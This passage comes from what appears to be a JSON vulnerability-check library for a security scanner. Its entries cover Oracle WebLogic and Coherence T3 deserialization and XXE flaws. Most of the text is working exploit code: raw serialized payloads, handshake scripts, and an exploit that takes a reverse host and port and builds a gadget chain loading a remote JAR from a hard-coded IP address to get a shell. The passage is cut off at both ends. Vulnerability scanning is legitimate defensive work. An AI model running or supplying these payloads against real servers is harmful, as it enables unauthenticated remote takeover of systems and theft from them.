\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x05\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x00\\xff\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x46\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\x00\\x0b\\x75\\x73\\x2d\\x6c\\x2d\\x62\\x72\\x65\\x65\\x6e\\x73\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x07\\x00\\x00\\x1b\\x59\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x78\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x1d\\x01\\x81\\x40\\x12\\x81\\x34\\xbf\\x42\\x76\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x00\\x00\\x78'\n\npayload=struct.pack('>I',len(payload)) + payload[4:]\n\nprint '[+] Sending payload...'\nsock.send(payload)\ndata = sock.recv(1024)\nprint >>sys.stderr, 'received \"%s\"' % data\n\n\n[Vendor]\nOracle\n\n\n[Vulnerability Type]\nNetwork Remote\n\n\n\n[Description]\nVulnerability in the Oracle Coherence product of Oracle Fusion Middleware (component: Caching,CacheStore,Invocation).\nSupported versions that are affected are 3.7.1.17, 12.1.3.0.0, 12.2.1.3.0 and 12.2.1.4.0.\nEasily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle Coherence.\nSuccessful attacks of this vulnerability can result in takeover of Oracle Coherence.\nCVSS 3.0 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).\n\n\n[Disclosure Timeline]\n2019/12/10\n\n\n[+] Disclaimer\nThe entry creation date may reflect when the CVE ID was allocated or reserved,\nand does not necessarily indicate when this vulnerability was discovered, shared with the affected vendor, publicly disclosed, or updated in CVE.\n\n[Video]\nhttps://www.youtube.com/watch?v=59jt8rr8ECc \n\n@nu11secur1ty  \n\n-- \n\nhiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=\n                          nu11secur1ty",
            "sysname": "weblogic",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "weblogic_EJBTaglibDescriptor_xxe",
            "description": "Weblogic EJBTaglibDescriptor XXE漏洞(CVE-2019-2890)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 7001\n    pocdict = {\n        \"vulnname\":\"weblogic_EJBTaglibDescriptor_xxe\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        def genRandomString(slen):\n            return ''.join(random.sample(string.ascii_letters, slen))\n        socket.setdefaulttimeout(30)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((host, port))\n        HELO = b't3 12.2.1\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://us-l-breens:7001\\n\\n'\n        print('[+][{0}]发送t3握手包'.format(host))\n        sock.sendall(HELO)\n        data = sock.recv(1024)\n        randomStr = genRandomString(12)\n        s1 = b'aced00057372002f7765626c6f6769632e736572766c65742e656a62326a73702e64642e454a425461676c696244657363726970746f7282ded23716d9cc790c000078707a0000'\n        s2 = b'041a3c3f786d6c2076657273696f6e3d22312e302220656e636f64696e673d225554462d38223f3e3c21444f435459504520786d6c726f6f746e616d65205b3c21454e544954592025206161612053595354454d2022687474703a2f2f'\n        s4 = bytes(bytes(randomStr.encode()).hex().encode()) + b'223e256161613b256363633b256464643b5d3e2f7777772e6265612e636f6d2f736572766572732f776c733630302f6474642f7765626c6f6769632d656a62326a73702e647464223e0a3c656a62326a73702d7461676c69623e0a20203c66696c6573797374656d2d696e666f3e0a202020203c6a617661632d706174683e3c2f6a617661632d706174683e0a202020203c6a617661632d666c6167733e3c2f6a617661632d666c6167733e0a202020203c636f6d70696c652d636c617373706174683e0a202020203c2f636f6d70696c652d636c617373706174683e0a202020203c6b65657067656e6572617465643e66616c73653c2f6b65657067656e6572617465643e0a202020203c736f757263652d706174683e0a202020203c2f736f757263652d706174683e0a202020203c7061636b6167652d6e616d653e3c2f7061636b6167652d6e616d653e0a202020203c656a622d6a61722d66696c653e3c2f656a622d6a61722d66696c653e0a202020203c736176652d61733e3c2f736176652d61733e0a202020203c736176652d7461676c69622d6a61723e0a2020202020203c746d706469723e3c2f746d706469723e0a2020202020203c7461676c69622d6a61722d66696c653e3c2f7461676c69622d6a61722d66696c653e0a202020203c2f736176652d7461676c69622d6a61723e0a202020203c736176652d7461676c69622d6469726563746f72793e0a2020202020203c636c61737365732d6469726563746f72793e3c2f636c61737365732d6469726563746f72793e0a2020202020203c746c642d66696c653e3c2f746c642d66696c653e0a202020203c2f736176652d7461676c69622d6469726563746f72793e0a20203c2f66696c6573797374656d2d696e666f3e0a20203c656a623e0a202020203c656a622d6e616d653e3c2f656a622d6e616d653e0a202020203c72656d6f74652d747970653e3c2f72656d6f74652d747970653e0a202020203c686f6d652d747970653e3c2f686f6d652d747970653e0a202020203c6a6e64692d6e616d653e3c2f6a6e64692d6e616d653e0a202020203c656a622d747970653e3c2f656a622d747970653e0a202020203c656e61626c65643e747275653c2f656e61626c65643e0a202020203c656a622d6d6574686f64733e0a202020203c2f656a622d6d6574686f64733e0a202020203c686f6d652d6d6574686f64733e0a202020203c2f686f6d652d6d6574686f64733e'\n        s5 = b'0' + len((s2 + s4).hex())[2:]\n        s6 = b'771c0a20203c2f656a623e0a3c2f656a62326a73702d7461676c69623e0a78'\n        payloadObj = bytes.fromhex((s1 + s5 + (s2 + s4) + s6))\n        payload='\\x00\\x00\\x09\\xf3\\x01\\x65\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x71\\x00\\x00\\xea\\x60\\x00\\x00\\x00\\x18\\x43\\x2e\\xc6\\xa2\\xa6\\x39\\x85\\xb5\\xaf\\x7d\\x63\\xe6\\x43\\x83\\xf4\\x2a\\x6d\\x92\\xc9\\xe9\\xaf\\x0f\\x94\\x72\\x02\\x79\\x73\\x72\\x00\\x78\\x72\\x01\\x78\\x72\\x02\\x78\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x70\\x70\\x70\\x70\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x06\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x01\\x00\\x00'\n        payload=payload+payloadObj\n        payload=payload+'\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x21\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x65\\x65\\x72\\x49\\x6e\\x66\\x6f\\x58\\x54\\x74\\xf3\\x9b\\xc9\\x08\\xf1\\x02\\x00\\x07\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x74\\x00\\x27\\x5b\\x4c\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2f\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2f\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2f\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\x3b\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x97\\x22\\x45\\x51\\x64\\x52\\x46\\x3e\\x02\\x00\\x03\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0e\\x72\\x65\\x6c\\x65\\x61\\x73\\x65\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x12\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x41\\x73\\x42\\x79\\x74\\x65\\x73\\x74\\x00\\x02\\x5b\\x42\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x05\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x00\\xff\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x46\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\x00\\x0b\\x75\\x73\\x2d\\x6c\\x2d\\x62\\x72\\x65\\x65\\x6e\\x73\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x07\\x00\\x00\\x1b\\x59\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x78\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x1d\\x01\\x81\\x40\\x12\\x81\\x34\\xbf\\x42\\x76\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x00\\x00\\x78'\n        payload = \"{0}{1}\".format(struct.pack('!i', len(payload)), payload[4:])\n        print('[+][{0}]发送Evil数据包'.format(host))\n        sock.send(payload)\n        print(sock.recv(1024))\n        if False:\n            pocdict['isvul'] = True\n            pocdict['payload'] = str(binascii.unhexlify(PAYLOAD[0]))\n            pocdict['proof'] = m\n            pocdict['response'] = str(rs)\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "weblogic",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "weblogic_wls_deserialize1",
            "description": "Weblogic WLS核心组件反序列化漏洞(CVE-2017-3248/CVE-2018-2628)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 7001\n    pocdict = {\n        \"vulnname\":\"weblogic_wls_deserialize1\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        index = 0\n        PAYLOAD = ['ACED0005737D00000001001D6A6176612E726D692E61637469766174696F6E2E416374697661746F72787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707372002D6A6176612E726D692E7365727665722E52656D6F74654F626A656374496E766F636174696F6E48616E646C657200000000000000020200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707729000A556E69636173745265660000000005A2000000005649E3FD00000000000000000000000000000078']\n        VER_SIG = ['\\\\$Proxy[0-9]+']\n\n        def t3handshake(sock, server_addr):\n            sock.connect(server_addr)\n            sock.send(binascii.unhexlify('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))\n            time.sleep(1)\n            sock.recv(1024)\n\n        def buildT3RequestObject(sock, port):\n            data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'\n            data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format(\n                '{:04x}'.format(port))\n            data3 = '1a7727000d3234322e323134'\n            data4 = '2e312e32353461863d1d0000000078'\n            for d in [data1, data2, data3, data4]:\n                sock.send(binascii.unhexlify(d))\n            time.sleep(2)\n            print(' ...接收长度: {0}'.format(len(sock.recv(2048))))\n\n        def sendEvilObjData(sock, data):\n            payload = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'\n            payload += data\n            payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'\n            payload = '{0:08x}{1}'.format(int(len(payload)/2 + 4), payload)\n            sock.send(binascii.unhexlify(payload))\n            time.sleep(2)\n            sock.send(binascii.unhexlify(payload))\n            res = ''\n            try:\n                while True:\n                    res = sock.recv(4096).decode('utf-8', 'ignore')\n                    time.sleep(0.1)\n                    if re.findall(VER_SIG[index], res, re.S):\n                        break\n            except Exception as e:\n                pass\n            return res\n\n        socket.setdefaulttimeout(30)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_addr = (host, port)\n        print('[+][{0}]发送t3握手包'.format(host))\n        t3handshake(sock, server_addr)\n        print('[+][{0}]建立t3请求对象'.format(host))\n        buildT3RequestObject(sock, port)\n        print('[+][{0}]发送恶意请求包'.format(host))\n        rs = sendEvilObjData(sock, PAYLOAD[index])\n        m = re.findall(VER_SIG[index], rs, re.S)\n        if len(m) > 0:\n            pocdict['isvul'] = True\n            pocdict['payload'] = str(binascii.unhexlify(PAYLOAD[0]))\n            pocdict['proof'] = m\n            pocdict['response'] = str(rs)\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "#!/usr/bin/python\nimport socket\nimport os\nimport sys\nimport struct\n\n\nif len(sys.argv) < 4:\n    print 'Usage: python %s <host> <port> <reverse_host> <reverse_port>' % os.path.basename(sys.argv[0])\n    sys.exit()\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(5)\n\nhost = sys.argv[1]\nport = int(sys.argv[2])\n\nserver_address = (host, port)\nprint '[+] Connecting to %s port %s' % server_address\nsock.connect(server_address)\n\n\nreverse_host = sys.argv[3]\nreverse_port = int(sys.argv[4])\n# Send headers\nheaders='t3 12.2.1\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://us-l-breens:7001\\n\\n'\nprint 'sending \"%s\"' % headers\nsock.sendall(headers)\n\ndata = sock.recv(1024)\nprint >>sys.stderr, 'received \"%s\"' % data\n\n\ndef padhex(s):\n\ts = s.strip('0x')\n\tif len(s) %2 !=0:\n\t\treturn '0'+s\n\telse:\n\t\treturn s\n\nhost_hex = padhex(hex(len(reverse_host))+reverse_host.encode('hex'))\nport_hex = padhex(hex(reverse_port))\n\n\npayloadObj = \"\"\"aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000047372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173734c6f61646572000000000000000000000078707372003e6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e7374616e74696174655472616e73666f726d6572348bf47fa486d03b0200025b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c0200007870000000017572000f5b4c6a6176612e6e65742e55524c3b5251fd24c51b68cd0200007870000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e001c4c0004686f737471007e001c4c000870726f746f636f6c71007e001c4c000372656671007e001c7870ffffffffffffffff74000f3137362e3132322e3135372e3131307400132f4a657852656d6f7465546f6f6c732e6a617271007e001e740004687474707078757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000017671007e00197372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b0005694172677371007e00144c000b694d6574686f644e616d6571007e001c5b000b69506172616d547970657371007e001578707571007e00170000000174000a4a6578526576657273657400096c6f6164436c6173737571007e002100000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e00137571007e0017000000027400%s737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b02000078700000%s7571007e00210000000271007e002b76720003696e7400000000000000000000007870737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878\"\"\"%(host_hex,port_hex)\n\n\npayload='\\x00\\x00\\x09\\xf3\\x01\\x65\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x71\\x00\\x00\\xea\\x60\\x00\\x00\\x00\\x18\\x43\\x2e\\xc6\\xa2\\xa6\\x39\\x85\\xb5\\xaf\\x7d\\x63\\xe6\\x43\\x83\\xf4\\x2a\\x6d\\x92\\xc9\\xe9\\xaf\\x0f\\x94\\x72\\x02\\x79\\x73\\x72\\x00\\x78\\x72\\x01\\x78\\x72\\x02\\x78\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x70\\x70\\x70\\x70\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x06\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\